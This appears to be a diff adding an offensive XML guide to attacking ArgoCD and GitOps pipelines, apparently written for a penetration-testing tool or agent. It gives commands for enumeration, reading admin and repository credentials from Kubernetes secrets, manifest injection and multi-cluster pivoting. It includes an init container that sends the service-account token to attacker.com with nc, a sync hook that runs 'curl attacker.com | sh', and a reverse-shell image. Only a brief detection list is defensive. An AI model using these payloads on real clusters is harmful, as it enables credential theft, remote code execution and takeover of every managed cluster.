@@ -1,0 +1,249 @@
+<vulnerability_guide>
+  <title>ARGOCD AND GITOPS ATTACKS</title>
+
+  <critical>ArgoCD is the most widely deployed GitOps tool, managing Kubernetes deployments declaratively from Git repositories. Compromising ArgoCD means controlling what runs in Kubernetes clusters. A single ArgoCD misconfiguration can grant cluster-admin across all managed clusters.</critical>
+
+  <scope>
+    - ArgoCD authentication bypass
+    - Repository access exploitation
+    - Kubernetes manifest manipulation
+    - Secret management weaknesses
+    - RBAC and permission escalation
+    - Multi-cluster attack chains
+  </scope>
+
+  <methodology>
+    1. ARGOCD ENUMERATION
+       {% raw %}
+       # Find ArgoCD instances
+       # Common URLs
+       https://argocd.target.com
+       https://argo.target.com
+       https://cd.target.com
+       /argocd
+
+       # Default ports
+       # 80/443 - Web UI
+       # 8080 - API server
+       # 8083 - Metrics
+
+       # API enumeration (unauthenticated)
+       curl https://argocd.target.com/api/version
+       curl https://argocd.target.com/api/v1/settings
+
+       # Check for SSO configuration
+       curl https://argocd.target.com/api/v1/settings | jq '.dexConfig'
+       {% endraw %}
+
+    2. AUTHENTICATION ATTACKS
+       {% raw %}
+       # Default credentials
+       # admin / argocd-initial-admin-secret (Kubernetes secret)
+
+       # Password from secret
+       kubectl get secret argocd-initial-admin-secret -n argocd -o jsonpath='{.data.password}' | base64 -d
+
+       # SSO bypass attempts
+       # Check for misconfigurations in OIDC/SAML
+       # Look for group mapping issues
+
+       # JWT token attacks
+       # ArgoCD uses JWT for sessions
+       # Check for weak secrets, algorithm confusion
+
+       # API token enumeration
+       argocd account list
+       argocd account get-user-info
+       {% endraw %}
+
+    3. REPOSITORY ACCESS EXPLOITATION
+       {% raw %}
+       # ArgoCD stores repo credentials
+       # If you have ArgoCD access:
+
+       # List repositories
+       argocd repo list
+
+       # Get repository credentials (if admin)
+       kubectl get secrets -n argocd -l argocd.argoproj.io/secret-type=repository
+
+       # Credential harvesting
+       # Repo credentials stored as Kubernetes secrets
+       # May include Git tokens, SSH keys
+
+       # Attack vector: Compromise repo to modify manifests
+       # All clusters syncing from repo get malicious deployments
+       {% endraw %}
+
+    4. MANIFEST INJECTION
+       {% raw %}
+       # If you can modify Git repository:
+
+       # Inject malicious container
+       # deployment.yaml
+       spec:
+         containers:
+         - name: malicious
+           image: attacker/reverse-shell
+           securityContext:
+             privileged: true
+
+       # Inject init container for secrets
+       spec:
+         initContainers:
+         - name: secret-stealer
+           image: alpine
+           command: ["/bin/sh", "-c"]
+           args: ["cat /var/run/secrets/kubernetes.io/serviceaccount/token | nc attacker.com 4444"]
+
+       # Modify ConfigMaps/Secrets
+       # Inject environment variables
+       # Modify service endpoints
+       {% endraw %}
+
+    5. RBAC ESCALATION
+       {% raw %}
+       # ArgoCD RBAC policies
+       # Check current permissions
+       argocd account can-i sync applications '*'
+       argocd account can-i get applications '*'
+
+       # Default RBAC issues
+       # - readonly role can still see secrets
+       # - project admin can deploy to any namespace
+
+       # Project misconfigurations
+       argocd proj list
+       argocd proj get <project>
+
+       # Check for:
+       # - destinations: * (any cluster/namespace)
+       # - clusterResourceWhitelist: * (any resource type)
+       # - sourceRepos: * (any repository)
+       {% endraw %}
+  </methodology>
+
+  <advanced_techniques>
+    <applicationset_abuse>
+      {% raw %}
+      # ApplicationSets auto-generate applications
+      # Can be abused for mass deployment
+
+      # Git generator exploitation
+      # If ApplicationSet uses Git generator with user input
+      apiVersion: argoproj.io/v1alpha1
+      kind: ApplicationSet
+      spec:
+        generators:
+        - git:
+            repoURL: https://github.com/org/repo
+            revision: HEAD
+            directories:
+            - path: apps/*  # Attacker creates malicious dir
+
+      # Matrix generator for multi-cluster
+      # Single compromise affects all clusters
+      {% endraw %}
+    </applicationset_abuse>
+
+    <helm_value_injection>
+      {% raw %}
+      # Helm-based applications accept values
+      # Check for injection in values
+
+      # Through ArgoCD UI/API
+      argocd app set myapp --helm-set 'image=attacker/malicious'
+
+      # Values file manipulation in Git
+      # values.yaml injection points:
+      # - image tags
+      # - command/args
+      # - environment variables
+      # - resource requests (for DoS)
+      {% endraw %}
+    </helm_value_injection>
+
+    <sync_window_bypass>
+      {% raw %}
+      # ArgoCD sync windows restrict when deploys happen
+      # But can be bypassed:
+
+      # 1. Direct kubectl if you have cluster access
+      # 2. Manual sync with --force (if permitted)
+      # 3. Modify sync window policy itself
+
+      # Check sync windows
+      argocd proj windows list <project>
+      {% endraw %}
+    </sync_window_bypass>
+
+    <resource_hooks>
+      {% raw %}
+      # ArgoCD resource hooks run at sync time
+      # Can execute arbitrary commands
+
+      # Pre-sync hook (runs before app sync)
+      apiVersion: batch/v1
+      kind: Job
+      metadata:
+        annotations:
+          argocd.argoproj.io/hook: PreSync
+      spec:
+        template:
+          spec:
+            containers:
+            - name: exploit
+              image: alpine
+              command: ["sh", "-c", "curl attacker.com | sh"]
+
+      # Hook phases: PreSync, Sync, PostSync, SyncFail
+      {% endraw %}
+    </resource_hooks>
+
+    <multi_cluster_pivoting>
+      {% raw %}
+      # ArgoCD often manages multiple clusters
+      # Compromise one, pivot to others
+
+      # List managed clusters
+      argocd cluster list
+
+      # Get cluster credentials (admin)
+      kubectl get secrets -n argocd -l argocd.argoproj.io/secret-type=cluster
+
+      # Deploy to different cluster
+      argocd app create exploit \
+        --repo https://attacker.com/exploit \
+        --path . \
+        --dest-server https://target-cluster \
+        --dest-namespace default
+      {% endraw %}
+    </multi_cluster_pivoting>
+  </advanced_techniques>
+
+  <detection>
+    - Monitor ArgoCD audit logs for unusual syncs
+    - Alert on new repository additions
+    - Track RBAC policy changes
+    - Monitor for application creates/deletes
+    - Check for credential secret access
+  </detection>
+
+  <validation>
+    - Successfully authenticate to ArgoCD
+    - Extract repository credentials
+    - Deploy malicious application
+    - Escalate RBAC permissions
+    - Access multiple clusters
+  </validation>
+
+  <pro_tips>
+    - ArgoCD Application resources are often in-cluster - kubectl can manage them
+    - Check for repo-server exec permissions (CVE-2022-24348)
+    - ApplicationSets with SCM generators can be weaponized
+    - ArgoCD image updater may have excessive permissions
+    - Notifications controller can leak secrets via webhooks
+  </pro_tips>
+
+  <remember>ArgoCD is a force multiplier - controlling it means controlling every cluster and application it manages. Focus on repository access first (Git credentials), then ArgoCD RBAC, then cluster credentials. A single malicious commit to a synced repository can compromise the entire infrastructure.</remember>
+</vulnerability_guide>
